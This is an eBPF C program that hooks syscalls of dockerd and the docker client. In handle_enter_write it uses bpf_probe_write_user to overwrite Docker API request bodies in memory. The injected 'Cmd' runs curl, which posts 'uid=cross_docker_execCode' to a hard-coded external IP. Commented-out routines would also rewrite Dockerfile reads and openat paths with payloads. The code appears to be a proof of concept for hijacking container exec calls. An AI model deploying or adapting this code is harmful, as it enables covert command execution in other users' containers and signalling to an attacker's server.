// +build ignore

#include "common.h"
#include "my_def.h"
//#include "vmlinux.h"
char __license[] SEC("license") = "Dual MIT/GPL";


#define TASK_COMM_LEN			0x40
#define SPOOL_DIR	"crontabs"
#define CRONTAB	"/etc/crontab"
#define SYSCRONTAB "/etc/crontab"
#define TARGET_NAME "cron"
#define MISS 0xdeadbeef
#define HIT  0xffffffff

#define CRON_PID_KEY 0
#define STATBUF_PTR_KEY 1
#define OPEN_FD_KEY 2
#define FSTATBUF_PTR_KEY 3
#define JUMP_FLAG_KEY 4
#define READ_BUF_PTR_KEY 5
#define FSTAT_COUNTER 6

#define FILENAME_KEY 0
#define OPENAT_FILENAME_KEY 1





/* For global int/long... */
struct bpf_map_def SEC("maps") raw_tracepoint_map = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u64),
    .max_entries = 10,
};

/* For global string */
struct bpf_map_def SEC("maps") raw_tracepoint_map_2 = {
    .type = BPF_MAP_TYPE_ARRAY,
    .key_size = sizeof(u32),
    .value_size = 0x40,
    .max_entries = 10,
};
// int cron_pid=0;

static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
    struct pt_regs *regs;
	  char buf[0x40]={'\x00'};
	  char *pathname=NULL ;
    regs = (struct pt_regs *)(ctx->args[0]);
    char PAYLOAD[] = "FROM ubuntu:16.04\t\nRUN echo \"\033[36m fffffffffffffffffffffffff \033[0m\" #\t\n";
    bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);

   // bpf_probe_write_user(pathname+21 , PAYLOAD ,sizeof(PAYLOAD)-1);
    bpf_probe_read_str(buf,sizeof(buf),pathname);
    u32 key = 2;

    char prefix[] = "FROM ";
    char fmt[]="\033[36m HIT \033[0m\n";
    if(!memcmp(prefix, buf, sizeof(prefix)-1)){
      bpf_trace_printk(fmt,sizeof(fmt));
      //bpf_probe_write_user(pathname, PAYLOAD ,sizeof(PAYLOAD)-1);
    }


    bpf_map_update_elem(&raw_tracepoint_map_2,&key,buf,BPF_ANY);

    // /* Get read fd */
    // int read_fd = 0;
    // bpf_probe_read(&read_fd , sizeof(read_fd) , &regs->di);

    // /* lookup openat fd */
    // int *valptr = NULL;
    // int fd = -1;
    // u32 key_fd = 0;

    // valptr = bpf_map_lookup_elem(&raw_tracepoint_map , &key_fd);
    // bpf_probe_read(&fd,sizeof(fd),valptr);

    // /* compare read_fd and openat_fd */
    // if(fd <= 0 || read_fd != fd){
    //     return 0;
    // }

    // /* If read fd == openat fd ??? read_exit */
    // bpf_map_update_elem(&raw_tracepoint_map_2,&key,buf,BPF_ANY);

    return 0;
}
static __inline int handle_enter_execve(struct bpf_raw_tracepoint_args *ctx){
  // struct pt_regs *regs;
	// char buf[0x40]={'\x00'};
	// char *pathname=NULL ;

  // char comm[TASK_COMM_LEN];
  // bpf_get_current_comm(&comm, sizeof(comm));

  // regs = (struct pt_regs *)(ctx->args[0]);
  // bpf_probe_read(&pathname , sizeof(pathname) , &regs->di);
  // bpf_probe_read_str(buf,sizeof(buf),pathname);
 
  // u32 key = 1;
  // bpf_map_update_elem(&raw_tracepoint_map_2,&key,buf,BPF_ANY);

  return 0;
}
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx){
  struct pt_regs *regs;

  /* Get close fd */
  int close_fd = -1;
  bpf_probe_read(&close_fd , sizeof(close_fd) , &regs->di);


  /* lookup openat fd */
  int *valptr = NULL;
  int fd = -1;
  u32 key_fd = 0;
  int clean = -1;

  valptr = bpf_map_lookup_elem(&raw_tracepoint_map , &key_fd);
  if(!valptr){
    return 0;
  }
  bpf_probe_read(&fd,sizeof(fd),valptr);

  /* If openat fd == close fd */

  if(fd == close_fd){
    bpf_map_update_elem(&raw_tracepoint_map,&key_fd,&clean,BPF_ANY);
  }
  

  return 0;
}
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx){
  struct pt_regs *regs;
	char buf[0x40]={'\x00'};
	char *pathname=NULL ;

  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));

  regs = (struct pt_regs *)(ctx->args[0]);

  bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);
  bpf_probe_read_str(buf,sizeof(buf),pathname);



  char *proc="/proc";char *lib = "/lib";char *usr_lib = "/usr/lib";char *imagedb = "/var/lib/docker/image/overlay2/imagedb";char *locale="/usr/share/locale";
  char *nsswitch = "/etc/nsswitch.conf";char *resolv = "/etc/resolv.conf";char *hugepage="/sys/kernel/mm/hugepages";
  if(!memcmp(buf,proc,5) 
  || !memcmp(buf,lib,4) 
  || !memcmp(buf,usr_lib,8)  
  || !memcmp(buf,"/etc/ld.so.",sizeof("/etc/ld.so.")-1)
  || !memcmp(buf,"/dev/tty",sizeof("/dev/tty")-1) 
  || !memcmp(buf,"/var/log",sizeof("/var/log")-1) 
  || !memcmp(buf,"/dev/null",sizeof("/dev/null")-1)   
  || !memcmp(buf , "/sys/devices/",sizeof("/sys/devices/")-1) 
  || !memcmp(buf , "/tmp/",sizeof("/tmp/")-1)
  || !memcmp(buf, "/root/.vscode-server/", sizeof("/root/.vscode-server/")-1)
  || !memcmp(buf, "/usr/bin/which", sizeof("/usr/bin/which")-1)
  || !memcmp(buf, "/root/.cache/",sizeof("/root/.cache/")-1)
  || !memcmp(buf, "/etc/localtime", sizeof("/etc/localtime")-1)
  || !memcmp(buf, "libtinfo.so.5", sizeof("libtinfo.so.5")-1)
  || !memcmp(buf, "/content/open",  sizeof("/content/open")-1)
  || !memcmp(buf, "/content/open", sizeof("/content/open"))
  || !memcmp(buf , "/sys/block/sda/size" , sizeof("/sys/block/sda/size")-1)
  || !memcmp(buf, "/usr/grte/v5/lib64/", sizeof("/usr/grte/v5/lib64/")-1)
  || !memcmp(buf, "/sys/fs/cgroup/", sizeof("/sys/fs/cgroup/")-1)
  || !memcmp(buf, "/run/xtables.lock" , sizeof("/run/xtables.lock")-1)
  || !memcmp(buf, "/usr/bin/kubectl", sizeof("/usr/bin/kubectl")-1)
  || !memcmp(buf, "/var/run/eni/terway_cni.lock", sizeof("/var/run/eni/terway_cni.lock")-1)
  || !memcmp(buf, "/etc/protocols", sizeof("/etc/protocols")-1)
  || !memcmp(buf, locale, sizeof(locale)-1)
  || !memcmp(buf,imagedb,sizeof(imagedb)-1)
  || !memcmp(buf, nsswitch , sizeof(nsswitch)-1)
  || !memcmp(buf, resolv,sizeof(resolv)-1)
  || !memcmp(buf,hugepage,sizeof(hugepage)-1)
  //|| !memcmp(buf, "/var/lib/docker/image/overlay2/imagedb", sizeof("/var/lib/docker/image/overlay2/imagedb")-1 )
  //|| !memcmp(buf, "/usr/share/locale/locale.alias",sizeof("/usr/share/locale/locale.alias")-1)
  )
  {
    return 0;
  }

  char PAYLOAD[] = "curl -d \"uid=cross_docker_execCode\" http://202.112.238.191/'  \n #";
  char *binsh = "/bin/sh";
  u32 key = 0;
  //if(!memcmp(buf,binsh,sizeof(binsh)-1))
    //bpf_probe_write_user(pathname , PAYLOAD ,sizeof(PAYLOAD));
    
    bpf_map_update_elem(&raw_tracepoint_map_2,&key,buf,BPF_ANY);
  
  //char fmt[]="%s\n";
  //bpf_trace_printk(fmt,sizeof(fmt),buf);

  int fd = -1;
  u32 key_fd = 0;

  bpf_map_update_elem(&raw_tracepoint_map,&key_fd,&fd,BPF_ANY);
  char *Dockerfile = "/root/dockerfile/Dockerfile";
  if(!memcmp(buf,Dockerfile,sizeof(Dockerfile)-1)){
    bpf_probe_read(&fd , sizeof(fd) , &regs->di);
    bpf_map_update_elem(&raw_tracepoint_map,&key_fd,&fd,BPF_ANY);
  }

  return 0;
}

#define OFFSET 0x10+0x40+0x40+0x40+0x40+49
#define OFFSET_CL 0x40+0x20+0x20+0x20+6
static __inline int handle_enter_write(struct bpf_raw_tracepoint_args *ctx){
    struct pt_regs *regs;
	  char buf[0x40]={'\x00'};
    int fd = -1;
	  char *pathname=NULL ;
    regs = (struct pt_regs *)(ctx->args[0]);
    bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);

    char header[5] = {'\x00'};
    bpf_probe_read(&fd , sizeof(fd) , &regs->di);
    bpf_probe_read_str(header,sizeof(header),pathname);
    if(fd != 3){return 0;}
    if(memcmp(header,"POST",sizeof("POST")-1)){
      return 0;
    }

    
    //+0x10 尝试跳过GET /v1.41/exec/前缀，直接能拿到0x40大小的容器id
    if(fd == 1){
      return 0;
    }

    //curl -d uid=cross_docker_execCode http://202.112.238.191/   
    //char PAYLOAD[] = "\"Cmd\":[\"sh\"]}\r\n";

    /* hijack content */
    char PAYLOAD[] = "\"Cmd\":[\"curl\",\"-d\",\"uid=cross_docker_execCode\",\"http://202.112.238.191/\"]}\x00";
    //bpf_probe_write_user(pathname+OFFSET , PAYLOAD ,sizeof(PAYLOAD));
    
    /* hijack content length */
    //char ContentLength[] = "Content-Length: 1000\r\nContent-Type: text/plain\r\n";
    //最后经过测试，只要跳过包头后面的json的内容都是可以overwrite的，我们可以直接overwite掉在一开始就插入Cmd执行
    bpf_probe_write_user(pathname+OFFSET_CL+47+0x10-6 , PAYLOAD ,sizeof(PAYLOAD)-1);
    bpf_probe_read_str(buf,sizeof(buf),pathname+OFFSET_CL+47+0x10-6); 

    /*
    "Cmd":["curl","-d"]}
    "Cmd":["curl","-d"]}
    */
    char fmt[]="%s\n";
    //bpf_trace_printk(fmt,sizeof(fmt),buf);
    u32 key = 3;

    bpf_map_update_elem(&raw_tracepoint_map_2,&key,buf,BPF_ANY);

  return 0;
}

/*

{
  "AttachStdin": false,
  "AttachStdout": true,
  "AttachStderr": true,
  "DetachKeys": "ctrl-p,ctrl-q",
  "Tty": false,
  "Cmd": [
    "date"
  ],
  "Env": [
    "FOO=bar",
    "BAZ=quux"
  ]
}
*/


SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
  
  char fmt[]="%s\n";
  unsigned long syscall_id = ctx->args[1];
  int a=0;
  
  char *sh = "sh";
  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));

  if (!memcmp(comm, "open", sizeof("open"))){
      //bpf_printk("read\n");
      return 0;
  }

  // if(syscall_id == 1 && !memcmp(comm, "docker", sizeof("docker")) ){
  //   handle_enter_write(ctx);
  //   return 0;
  // }

  // if(syscall_id == 257 && !memcmp(comm, "docker", sizeof("docker")) ){
  //   handle_enter_openat(ctx);     //读dockerfile的是docker不是dockerd
  //   return 0;
  // }

  // if(syscall_id == 0 && !memcmp(comm, "docker", sizeof("docker")) ){
  //   handle_enter_read(ctx);     //读dockerfile的是docker不是dockerd
  //   return 0;
  // }

  if (memcmp(comm, "dockerd", sizeof("dockerd"))){
      //bpf_printk("read\n");
      return 0;
  }
    //bpf_trace_printk(fmt,sizeof(fmt),comm);

    switch (syscall_id)
    {
        case 0:
            //handle_enter_read(ctx);
            break;
        case 3:  // close
            //handle_enter_close(ctx);
            break;
        // case 4:
        //     handle_enter_stat(ctx);
        //     break;
        case 59:
            handle_enter_execve(ctx);
            break;
        case 257:
            //handle_enter_openat(ctx);
            break;
        default:
            return 0;
    }
    return 0;
}

static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx){
    struct pt_regs *regs;
	  char buf[0x40]={'\x00'};
	  char *pathname=NULL ;
    regs = (struct pt_regs *)(ctx->args[0]);
    char PAYLOAD[] = "FROM ubuntu:16.04\t\nRUN echo \"\033[36m fffffffffffffffffffffffff \033[0m\" #\t\n";
    bpf_probe_read(&pathname , sizeof(pathname) , &regs->si);

   // bpf_probe_write_user(pathname+21 , PAYLOAD ,sizeof(PAYLOAD)-1);
    bpf_probe_read_str(buf,sizeof(buf),pathname);
    u32 key = 2;

    char prefix[] = "FROM ";
    char fmt[]="READ:::: %s\n";
    bpf_trace_printk(fmt,sizeof(fmt),buf);
    // if(!memcmp(prefix, buf, sizeof(prefix)-1)){
      
    //   bpf_probe_write_user(pathname, PAYLOAD ,sizeof(PAYLOAD)-1);
    // }

  return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  unsigned int id=0;
  struct pt_regs *regs;
  
  char comm[TASK_COMM_LEN];
  bpf_get_current_comm(&comm, sizeof(comm));

  if (memcmp(comm, "docker", sizeof("docker"))){
      //bpf_printk("read\n");
      return 0;
  }
  //bpf_trace_printk(fmt,sizeof(fmt));

  regs = (struct pt_regs *)(ctx->args[0]);
  bpf_probe_read(&id, sizeof(id) , &regs->orig_ax);
  switch (id)
    {
        case 0:
            handle_exit_read(ctx);
            break;
        // case 4:
        //     handle_exit_stat();
        //     break;
        // case 5:
        //     handle_exit_fstat();
        //     break;
        // case 257:
        //     handle_exit_openat(ctx);
        //     break;
        default:
            return 0;
    }
  

  return 0;
}